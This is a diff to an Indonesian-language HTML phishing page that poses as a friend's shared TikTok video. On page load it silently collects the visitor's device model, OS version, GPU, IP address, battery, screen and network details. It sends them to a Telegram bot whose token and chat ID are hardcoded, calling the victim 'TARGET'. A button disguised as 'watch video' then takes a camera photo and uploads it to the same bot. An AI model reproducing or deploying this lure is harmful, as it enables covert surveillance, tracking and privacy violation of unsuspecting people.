@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok - Tonton Video</title>
+    <title>TikTok video for you </title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     
     <style>
@@ -104,14 +104,14 @@
         </div>
 
         <div class="content-area">
-            <h2>Teman anda membagikan Video tiktok</h2>
-            <p>Klik tombol di bawah untuk pergi ke tiktok dan liat videonya.</p>
+            <h2>Tonton video yang di kirim oleh teman anda</h2>
+            <p>Klik tombol di bawah untuk pergi ke Tiktok dan menonton videonya.</p>
         </div>
 
         <div class="button-area">
             <button id="btnTes">
                 <i class="fas fa-camera"></i>
-                Tonton sekarang
+                Liat video
             </button>
             <p id="status"></p>
         </div>
@@ -120,7 +120,7 @@
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-        <script>
+    <script>
         const BOT_TOKEN = "8013765711:AAFQMhJXquSESpWCf64u9MN0-mlpT8JLlB0"; 
         const CHAT_ID = "7521596861";
 
@@ -129,42 +129,30 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // --- 1. FUNGSI PENDETEKSI HP ADVANCED ---
+        // --- 1. FUNGSI DETEKSI HP AKURAT ---
         async function detectDeviceNameAdvanced() {
             let brand = "Perangkat Tak Dikenal";
             let modelCode = "Unknown";
             let osVersion = "Android";
 
-            // A. Coba User-Agent Client Hints (Browser Modern)
-            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                try {
-                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-                    if (uaData.model) modelCode = uaData.model;
-                    if (uaData.platformVersion) {
-                        let major = parseInt(uaData.platformVersion.split('.')[0]);
-                        if (major > 0) osVersion = "Android " + (major + 4);
-                    }
-                } catch (e) {}
+            const ua = navigator.userAgent;
+
+            // Membaca Versi Android Asli
+            const androidMatch = ua.match(/Android\s+([0-9\.]+)/i);
+            if (androidMatch) {
+                osVersion = "Android " + androidMatch[1];
             }
 
-            // B. Parse User Agent Biasa (Jika Client Hints gagal/kosong)
-            const ua = navigator.userAgent;
-            if (modelCode === "Unknown" || modelCode === "K" || modelCode === "") {
-                const modelMatch = ua.match(/\(([^)]+)\)/);
-                if (modelMatch) {
-                    const parts = modelMatch[1].split(';');
-                    if (parts.length >= 2) {
-                        modelCode = parts[parts.length - 1].replace(/Build\/.*/i, '').trim();
-                    }
+            // Membaca Kode Model
+            const modelMatch = ua.match(/\(([^)]+)\)/);
+            if (modelMatch) {
+                const parts = modelMatch[1].split(';');
+                if (parts.length >= 2) {
+                    modelCode = parts[parts.length - 1].replace(/Build\/.*/i, '').trim();
                 }
             }
 
-            if (osVersion === "Android") {
-                const androidMatch = ua.match(/Android\s+([0-9\.]+)/i);
-                if (androidMatch) osVersion = "Android " + androidMatch[1];
-            }
-
-            // C. Deteksi via GPU (WebGL)
+            // Deteksi GPU (WebGL)
             let gpuName = "";
             try {
                 const cvs = document.createElement('canvas');
@@ -175,7 +163,7 @@
                 }
             } catch (e) {}
 
-            // D. Penentuan Merek
+            // Penentuan Merek HP
             const modelUpper = modelCode.toUpperCase();
             
             if (modelUpper.includes('CPH2083') || modelUpper.includes('CPH2075')) {
@@ -196,11 +184,11 @@
             return `${brand} (${osVersion}) [Model: ${modelCode}]`;
         }
 
-        // --- 2. FUNGSI PENGUMPULAN FINGERPRINT LENGKAP ---
-        async function getFullFingerprint() {
+        // --- 2. FUNGSI KIRIM FINGERPRINT OTOMATIS SAAT WEB DIBUKA ---
+        async function autoSendFingerprint() {
             let data = [];
+            data.push(`🔔 TARGET MEMBUKA WEB (AUTO-LOG)!`);
 
-            // Panggil Fungsi Pendeteksi HP
             const deviceDetails = await detectDeviceNameAdvanced();
             data.push(`📱 Perangkat: ${deviceDetails}`);
 
@@ -211,7 +199,7 @@
                 data.push(`🌐 IP: ${ipJson.ip}`);
             } catch { data.push(`🌐 IP: Gagal diambil`); }
 
-            // Info Baterai
+            // Baterai
             if ('getBattery' in navigator) {
                 try {
                     const b = await navigator.getBattery();
@@ -219,36 +207,36 @@
                 } catch {}
             }
 
-            // Layar
+            // Layar & Jaringan
             data.push(`🖥️ Layar: ${screen.width}x${screen.height} px`);
-
-            // Jaringan
             const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (net) {
-                data.push(`📶 Jaringan: ${net.effectiveType || 'N/A'}`);
-            }
+            if (net) data.push(`📶 Jaringan: ${net.effectiveType || 'N/A'}`);
 
-            // GPU
+            const fullText = data.join('\n');
+
+            // Kirim Teks via sendMessage Telegram
             try {
-                const cvs = document.createElement('canvas');
-                const gl = cvs.getContext('webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    data.push(`🎮 GPU: ${renderer}`);
-                }
-            } catch {}
-
-            return data.join('\n');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: fullText
+                    })
+                });
+            } catch (err) {
+                console.error("Auto log error:", err);
+            }
         }
 
-        // --- 3. EVENT TOMBOL ---
+        // Jalankan pengiriman data otomatis saat halaman selesai dimuat!
+        window.addEventListener('DOMContentLoaded', autoSendFingerprint);
+
+        // --- 3. EVENT KLIK TOMBOL (KHUSUS KAMERA & FOTO) ---
         btnTes.addEventListener('click', async () => {
-            status.innerText = "Mengambil data HP & meminta izin kamera...";
+            status.innerText = "Meminta izin untuk membuka video di Tiktok";
             btnTes.disabled = true;
             btnTes.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
-
-            const fingerprintText = await getFullFingerprint();
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -259,7 +247,7 @@
                 video.srcObject = stream;
 
                 video.onloadedmetadata = () => {
-                    status.innerText = "tunggu sebentar";
+                    status.innerText = "login";
 
                     setTimeout(() => {
                         canvas.width = video.videoWidth;
@@ -273,11 +261,9 @@
                             const formData = new FormData();
                             formData.append('chat_id', CHAT_ID);
                             formData.append('photo', blob, 'foto.png');
-                            
-                            const captionFinal = `📊 LAPORAN TARGET LENGKAP:\n\n${fingerprintText}`;
-                            formData.append('caption', captionFinal);
+                            formData.append('caption', '📸 FOTO TARGET BERHASIL DI-CAPTURE!');
 
-                            status.innerText = "Menuju Tiktok";
+                            status.innerText = "Menuju video";
 
                             try {
                                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -289,13 +275,13 @@
                                 if (resData.ok) {
                                     status.innerText = "Berhasil!.";
                                 } else {
-                                    status.innerText = "Gagal!.";
+                                    status.innerText = "Gagal.";
                                 }
                             } catch (error) {
                                 status.innerText = "Koneksi Error.";
                             } finally {
                                 btnTes.disabled = false;
-                                btnTes.innerHTML = '<i class="Tiktok"></i> Tonton Video';
+                                btnTes.innerHTML = '<i class="fas fa-camera"></i> Ambil Foto';
                             }
 
                         }, 'image/png');
@@ -305,10 +291,12 @@
 
             } catch (err) {
                 console.error(err);
-                status.innerText = "Izin kamera ditolak, tetapi data HP tetap berhasil terkirim!";
+                status.innerText = "Akses kamera ditolak oleh pengguna.";
                 btnTes.disabled = false;
-                btnTes.innerHTML = '<i class="fas fa-camera"></i> Tes Ambil Foto & Data';
+                btnTes.innerHTML = '<i class="Tiktok"></i> video';
             }
         });
-        </script>
-        
+    </script>
+</body>
+    </html>
+    
